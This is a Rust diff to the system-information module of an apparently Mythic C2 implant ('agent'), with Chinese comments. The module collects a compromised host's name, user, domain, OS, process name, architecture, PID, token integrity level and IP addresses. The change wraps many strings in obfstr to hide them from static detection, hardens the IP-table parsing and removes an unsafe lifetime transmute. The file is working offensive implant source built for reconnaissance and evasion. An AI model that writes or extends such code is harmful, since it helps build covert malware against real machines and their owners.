@@ -13,6 +13,7 @@
 //!    - 通过进程 Token 评估 RID（Low: 0x1000, Medium: 0x2000, High: 0x3000, System: 0x4000），
 //!      严密映射为 Mythic 4.0 官方数字标准（1: Low, 2: Medium, 3: High, 4: SYSTEM）。
 
+use crate::buffer::StackVec;
 use crate::error::AgentError;
 
 /// 系统信息采集定长纯栈暂存工作区 (Zero-Heap Stack Workspace)
@@ -27,9 +28,10 @@ pub struct SysInfoWorkspace {
     os_len: usize,
     proc_buf: [u8; 128],
     proc_len: usize,
+    arch_buf: [u8; 8],
+    arch_len: usize,
     ip_buf: [[u8; 16]; 4],
     ip_lens: [usize; 4],
-    ip_slice_storage: [&'static str; 4],
     ip_count: usize,
 }
 
@@ -53,16 +55,17 @@ impl SysInfoWorkspace {
             os_len: 0,
             proc_buf: [0u8; 128],
             proc_len: 0,
+            arch_buf: [0u8; 8],
+            arch_len: 0,
             ip_buf: [[0u8; 16]; 4],
             ip_lens: [0usize; 4],
-            ip_slice_storage: ["127.0.0.1", "", "", ""],
-            ip_count: 1,
+            ip_count: 0,
         }
     }
 }
 
-/// 采集完成的系统元数据不可变快照 (仅包含栈借用切片)
-#[derive(Clone, Copy)]
+/// 采集完成的系统元数据不可变快照 (仅包含栈借用切片与栈容器)
+#[derive(Clone)]
 #[cfg_attr(any(debug_assertions, test), derive(Debug))]
 pub struct SysInfoSnapshot<'a> {
     pub host: &'a str,
@@ -70,10 +73,10 @@ pub struct SysInfoSnapshot<'a> {
     pub domain: &'a str,
     pub os: &'a str,
     pub process_name: &'a str,
-    pub architecture: &'static str,
+    pub architecture: &'a str,
     pub pid: u32,
     pub integrity_level: u8,
-    pub ips: &'a [&'a str],
+    pub ips: StackVec<&'a str, 4>,
 }
 
 impl SysInfoWorkspace {
@@ -191,6 +194,7 @@ impl SysInfoWorkspace {
         }
 
         // 6. 获取当前进程映像名称 (Process Name)
+        obfstr::obfstr!(let def_proc = "wisconsin.exe";);
         let mut full_path_buf = [0u8; 260];
         let path_len = unsafe {
             win32::GetModuleFileNameA(
@@ -206,26 +210,32 @@ impl SysInfoWorkspace {
                 .rsplit('\\')
                 .next()
                 .or_else(|| full_path.rsplit('/').next())
-                .unwrap_or("wisconsin.exe");
+                .unwrap_or(def_proc);
             self.proc_buf[..file_name.len()].copy_from_slice(file_name.as_bytes());
             self.proc_len = file_name.len();
         } else {
-            obfstr::obfstr!(let def = "wisconsin.exe";);
-            self.proc_buf[..def.len()].copy_from_slice(def.as_bytes());
-            self.proc_len = def.len();
+            self.proc_buf[..def_proc.len()].copy_from_slice(def_proc.as_bytes());
+            self.proc_len = def_proc.len();
         }
 
         // 7. 评估系统架构 (Architecture)
-        let arch = unsafe {
+        unsafe {
             let mut sys_info = core::mem::MaybeUninit::<win32::SYSTEM_INFO>::uninit();
             win32::GetNativeSystemInfo(sys_info.as_mut_ptr());
             let info = sys_info.assume_init();
-            match info.wProcessorArchitecture {
-                9 => "x64",
-                12 => "arm64",
-                0 => "x86",
-                _ => "x64",
+            obfstr::obfstr! {
+                let arch_x64 = "x64";
+                let arch_arm64 = "arm64";
+                let arch_x86 = "x86";
             }
+            let arch_name = match info.wProcessorArchitecture {
+                9 => arch_x64,
+                12 => arch_arm64,
+                0 => arch_x86,
+                _ => arch_x64,
+            };
+            self.arch_buf[..arch_name.len()].copy_from_slice(arch_name.as_bytes());
+            self.arch_len = arch_name.len();
         };
 
         // 8. 评估进程 Token 完整性级别 (Integrity Level)
@@ -245,10 +255,14 @@ impl SysInfoWorkspace {
         let mut found = 0;
         if ret == 0 && table_size >= 4 {
             let num_entries = unsafe { *(table_buf.as_ptr() as *const u32) };
+            let row_size = core::mem::size_of::<win32::MIB_IPADDRROW>();
+            let max_possible_entries = (table_buf.len().min(table_size as usize).saturating_sub(4)) / row_size;
+            let valid_entries = (num_entries as usize).min(max_possible_entries);
+
             let rows = unsafe {
                 core::slice::from_raw_parts(
                     table_buf.as_ptr().add(4) as *const win32::MIB_IPADDRROW,
-                    num_entries as usize,
+                    valid_entries,
                 )
             };
 
@@ -270,10 +284,6 @@ impl SysInfoWorkspace {
                 if found < 4 {
                     let len = format_ipv4(&mut self.ip_buf[found], b0, b1, b2, b3);
                     self.ip_lens[found] = len;
-                    let s = unsafe {
-                        core::str::from_utf8_unchecked(&self.ip_buf[found][..len])
-                    };
-                    self.ip_slice_storage[found] = unsafe { core::mem::transmute::<&str, &'static str>(s) };
                     found += 1;
                 }
             }
@@ -283,10 +293,16 @@ impl SysInfoWorkspace {
             obfstr::obfstr!(let loopback = "127.0.0.1";);
             self.ip_buf[0][..loopback.len()].copy_from_slice(loopback.as_bytes());
             self.ip_lens[0] = loopback.len();
-            self.ip_slice_storage[0] = "127.0.0.1";
             found = 1;
         }
         self.ip_count = found;
+
+        let mut ips = StackVec::<&'_ str, 4>::new();
+        for i in 0..self.ip_count {
+            if let Ok(s) = core::str::from_utf8(&self.ip_buf[i][..self.ip_lens[i]]) {
+                let _ = ips.push(s);
+            }
+        }
 
         let host = core::str::from_utf8(&self.host_buf[..self.host_len])
             .map_err(|_| AgentError::SysinfoFailed)?;
@@ -298,6 +314,8 @@ impl SysInfoWorkspace {
             .map_err(|_| AgentError::SysinfoFailed)?;
         let process_name = core::str::from_utf8(&self.proc_buf[..self.proc_len])
             .map_err(|_| AgentError::SysinfoFailed)?;
+        let arch = core::str::from_utf8(&self.arch_buf[..self.arch_len])
+            .unwrap_or("");
 
         Ok(SysInfoSnapshot {
             host,
@@ -308,7 +326,7 @@ impl SysInfoWorkspace {
             architecture: arch,
             pid,
             integrity_level,
-            ips: &self.ip_slice_storage[..self.ip_count],
+            ips,
         })
     }
 
@@ -384,11 +402,15 @@ impl SysInfoWorkspace {
 
     #[cfg(not(windows))]
     fn collect_fallback(&mut self) -> Result<SysInfoSnapshot<'_>, AgentError> {
-        let def_host = "MOCK-HOST";
-        let def_user = "test-user";
-        let def_domain = "WORKGROUP";
-        let def_os = "Windows 11 Mock";
-        let def_proc = "mock_agent.exe";
+        obfstr::obfstr! {
+            let def_host = "MOCK-HOST";
+            let def_user = "test-user";
+            let def_domain = "WORKGROUP";
+            let def_os = "Windows 11 Mock";
+            let def_proc = "mock_agent.exe";
+            let def_ip = "127.0.0.1";
+            let def_arch = "x64";
+        }
 
         self.host_buf[..def_host.len()].copy_from_slice(def_host.as_bytes());
         self.host_len = def_host.len();
@@ -400,20 +422,35 @@ impl SysInfoWorkspace {
         self.os_len = def_os.len();
         self.proc_buf[..def_proc.len()].copy_from_slice(def_proc.as_bytes());
         self.proc_len = def_proc.len();
+        self.arch_buf[..def_arch.len()].copy_from_slice(def_arch.as_bytes());
+        self.arch_len = def_arch.len();
 
-        self.ip_slice_storage[0] = "127.0.0.1";
+        self.ip_buf[0][..def_ip.len()].copy_from_slice(def_ip.as_bytes());
+        self.ip_lens[0] = def_ip.len();
         self.ip_count = 1;
 
+        let mut ips = StackVec::<&'_ str, 4>::new();
+        if let Ok(s) = core::str::from_utf8(&self.ip_buf[0][..self.ip_lens[0]]) {
+            let _ = ips.push(s);
+        }
+
+        let host = core::str::from_utf8(&self.host_buf[..self.host_len]).unwrap_or("");
+        let user = core::str::from_utf8(&self.user_buf[..self.user_len]).unwrap_or("");
+        let domain = core::str::from_utf8(&self.domain_buf[..self.domain_len]).unwrap_or("");
+        let os = core::str::from_utf8(&self.os_buf[..self.os_len]).unwrap_or("");
+        let process_name = core::str::from_utf8(&self.proc_buf[..self.proc_len]).unwrap_or("");
+        let architecture = core::str::from_utf8(&self.arch_buf[..self.arch_len]).unwrap_or("");
+
         Ok(SysInfoSnapshot {
-            host: def_host,
-            user: def_user,
-            domain: def_domain,
-            os: def_os,
-            process_name: def_proc,
-            architecture: "x64",
+            host,
+            user,
+            domain,
+            os,
+            process_name,
+            architecture,
             pid: 1337,
             integrity_level: 3,
-            ips: &self.ip_slice_storage[..self.ip_count],
+            ips,
         })
     }
 }
